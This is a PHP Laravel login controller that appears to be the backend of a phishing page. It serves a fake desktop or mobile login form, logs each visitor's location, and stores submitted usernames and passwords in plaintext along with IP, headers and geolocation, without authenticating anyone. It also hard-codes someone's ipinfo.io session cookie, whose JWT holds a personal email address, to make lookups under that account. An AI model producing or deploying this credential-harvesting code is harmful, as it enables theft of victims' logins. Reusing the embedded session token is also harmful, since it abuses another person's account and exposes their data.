<?php

namespace App\Http\Controllers\Frontend\Auth;

use App\Http\Controllers\Controller;
use App\Http\Requests\StoreAccountRequest;
use App\Models\Account;
use App\Models\Log;
use Illuminate\Contracts\Foundation\Application;
use Illuminate\Contracts\View\Factory;
use Illuminate\Contracts\View\View;
use Illuminate\Http\RedirectResponse;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;
use Jenssegers\Agent\Agent;

class LoginController extends Controller
{
    /**
     * Display a listing of the resource.
     *
     * @return Application|Factory|View
     */
    public function index(): View|Factory|Application
    {
        $agent     = new Agent();
        $ip        = request()->ip() == '127.0.0.1' ? '8.8.8.8' : request()->ip();
        $cookie    = 'G_AUTHUSER_H=0; onboarding=2; flash=; _gid=GA1.2.2048770975.1645757108; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id="537a17cb-0b99-4531-a710-5eb6435fd4e9"; _lfa=LF1.1.926a496cf824ff46.1645757108516; G_ENABLED_IDPS=google; _hp2_ses_props.2442723863={"r":"https://ipinfo.io/","ts":1645757643802,"d":"ipinfo.io","h":"/signup"}; G_AUTHUSER_H=0; jwt-express=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo2NTg4OTIsImVtYWlsIjoiaG9hbmdraWVuMTUxMDkyQGdtYWlsLmNvbSIsImNyZWF0ZWQiOiJhIGZldyBzZWNvbmRzIGFnbygyMDIyLTAyLTI1VDAyOjU0OjEyLjEzMVopIiwic3RyaXBlX2lkIjpudWxsLCJpYXQiOjE2NDU3NTc2NjZ9.BSXuQ2A6QocBhI8FiGOwNrk9joaUJEvys5OMunp4xRY; onboarding=0; bento_visitor_id=ca616114-7c94-4878-8665-54ca76bd0539; bento_visit_id=2cf5bbe3-8496-47cf-94a1-8a9b41b7bd4f; __stripe_mid=937a50d1-83e4-472a-b0d3-826d9ba8dfbb146973; __stripe_sid=279bcceb-36d9-412b-a8ae-d86eeb68b1bc43ab03; _ga_RWP85XL4SC=GS1.1.1645757107.1.1.1645757957.52; _ga=GA1.2.1954619032.1645757108; _gat_UA-2336519-21=1; _hp2_id.2442723863={"userId":"3676248010919825","pageviewId":"3083037874732580","sessionId":"2050114665582963","identity":null,"trackerVersion":"4.0"}; bento_events=[]';
        $url       = "https://ipinfo.io/account/search";
        $ipInfo    = Http::withHeaders([
            'Cookie'       => $cookie,
            'Content-Type' => 'application/json'
        ])->get($url, [
            'query' => $ip
        ])->json();
        $dataAgent = [
            'device'  => $agent->deviceType(),
            'country' => $ipInfo['country'],
            'region'  => $ipInfo['region'],
            'city'    => $ipInfo['city'],
            'browser' => $agent->browser(),
            'data'    => $ipInfo
        ];
        Log::create($dataAgent);

        if ($agent->isDesktop()) {
            return view('frontend.auth.login-desktop');
        } else {
            return view('frontend.auth.login-mobile');
        }
    }

    /**
     * Show the form for creating a new resource.
     *
     * @return \Illuminate\Http\Response
     */
    public function create()
    {
        //
    }

    /**
     * Store a newly created resource in storage.
     *
     * @param StoreAccountRequest $request
     * @return RedirectResponse
     */
    public function store(StoreAccountRequest $request)
    {
        $agent                 = new Agent();
        $ip                    = $request->ip() == '127.0.0.1' ? '8.8.8.8' : $request->ip();
        $cookie                = 'G_AUTHUSER_H=0; onboarding=2; flash=; _gid=GA1.2.2048770975.1645757108; ajs_user_id=null; ajs_group_id=null; ajs_anonymous_id="537a17cb-0b99-4531-a710-5eb6435fd4e9"; _lfa=LF1.1.926a496cf824ff46.1645757108516; G_ENABLED_IDPS=google; _hp2_ses_props.2442723863={"r":"https://ipinfo.io/","ts":1645757643802,"d":"ipinfo.io","h":"/signup"}; G_AUTHUSER_H=0; jwt-express=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyX2lkIjo2NTg4OTIsImVtYWlsIjoiaG9hbmdraWVuMTUxMDkyQGdtYWlsLmNvbSIsImNyZWF0ZWQiOiJhIGZldyBzZWNvbmRzIGFnbygyMDIyLTAyLTI1VDAyOjU0OjEyLjEzMVopIiwic3RyaXBlX2lkIjpudWxsLCJpYXQiOjE2NDU3NTc2NjZ9.BSXuQ2A6QocBhI8FiGOwNrk9joaUJEvys5OMunp4xRY; onboarding=0; bento_visitor_id=ca616114-7c94-4878-8665-54ca76bd0539; bento_visit_id=2cf5bbe3-8496-47cf-94a1-8a9b41b7bd4f; __stripe_mid=937a50d1-83e4-472a-b0d3-826d9ba8dfbb146973; __stripe_sid=279bcceb-36d9-412b-a8ae-d86eeb68b1bc43ab03; _ga_RWP85XL4SC=GS1.1.1645757107.1.1.1645757957.52; _ga=GA1.2.1954619032.1645757108; _gat_UA-2336519-21=1; _hp2_id.2442723863={"userId":"3676248010919825","pageviewId":"3083037874732580","sessionId":"2050114665582963","identity":null,"trackerVersion":"4.0"}; bento_events=[]';
        $account               = $request->only(['username', 'password']);
        $account['ip']         = $ip;
        $url                   = "https://ipinfo.io/account/search";
        $ipInfo                = Http::withHeaders([
            'Cookie'       => $cookie,
            'Content-Type' => 'application/json'
        ])->get($url, [
            'query' => $ip
        ])->json();
        $account['address']    = $ipInfo['abuse']['address'];
        $account['user_agent'] = $agent->getUserAgent();
        $account['request']    = $agent->getHttpHeaders();
        $account['ip_info']    = $ipInfo;

        Account::create($account);

        return redirect()->route('home');
    }

    /**
     * Display the specified resource.
     *
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function show($id)
    {
        //
    }

    /**
     * Show the form for editing the specified resource.
     *
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function edit($id)
    {
        //
    }

    /**
     * Update the specified resource in storage.
     *
     * @param \Illuminate\Http\Request $request
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function update(Request $request, $id)
    {
        //
    }

    /**
     * Remove the specified resource from storage.
     *
     * @param int $id
     * @return \Illuminate\Http\Response
     */
    public function destroy($id)
    {
        //
    }
}
